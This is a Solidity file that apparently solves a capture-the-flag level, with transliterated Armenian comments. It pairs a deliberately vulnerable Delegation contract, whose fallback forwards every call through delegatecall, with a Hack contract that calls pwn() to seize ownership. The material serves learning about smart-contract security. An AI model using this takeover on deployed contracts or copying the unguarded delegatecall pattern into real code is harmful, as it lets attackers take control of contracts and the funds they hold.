// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }
//xndiry es funccian taki delagation kantracti kontextum irakanacneln a
  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

contract Hack {
 //kanchum enq Delegation verevi contracty ira hascen dnelov stegh_del u ira meji pwn funkciayin enq dimum, sakayn ira mej tenc funkcia chka dra hamar
 //inqy gnum a fallback, nranov delegate u arden yndegh eghac pwn funkciayov poxum a msg.sender-y
 //hacker contracti hasceyov vory tx er arel
    function hack(address _del) external {
        (bool success,) = _del.call(
            abi.encodeWithSignature("pwn()")
        );
        require(success);

    }
}